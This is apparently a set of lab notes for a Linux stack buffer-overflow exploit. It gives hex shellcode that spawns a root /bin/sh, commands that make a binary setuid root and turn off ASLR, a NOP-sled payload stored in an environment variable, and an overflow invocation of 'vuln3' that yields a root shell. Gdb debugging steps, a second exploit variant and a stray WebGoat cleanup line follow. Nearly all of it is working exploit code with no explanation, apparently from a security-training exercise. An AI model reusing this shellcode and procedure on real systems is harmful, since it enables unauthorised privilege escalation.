
chown root.users program
chmod +s program
perl -e 'print "\x31\xc0\xb0\x46\31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";' > shellcode2

vim vuln3

echo 0 > /proc/sys/kernel/randomize_va_space
su norights
whoami
export SHC=`perl -e 'print "\x90"x125;'``cat shellcode2`
./getenvaddr SHC
# plus 4,8,16 to the last byte
# remember to write it from the last byte to the first 
# but do not swap the digits of one byte
./vuln3 `perl -e 'print "\x7a\xfe\xff\xbf"x15;'`
whoami


Debug:
----------------------------------------------------------------
gdb vuln3
run `perl -e 'print "\x7a\xfe\xff\xbf"x15;'

gdb vuln3
break main
catch exec
run `perl -e 'print "\x7a\xfe\xff\xbf"x15;'
x/50x $edi-50
x/20i
x/20s


Variante2:
---------------------------------------------------------------
vim vuln2
vim exploit2.c

echo 0 > /proc/sys/kernel/randomize_va_space
su norights
whoami
./exploint3

gdb ./exploiter


--------------------------------------------------------------

 delete the property files in <tomcat_root>/webapps/WebGoat/users/*.props
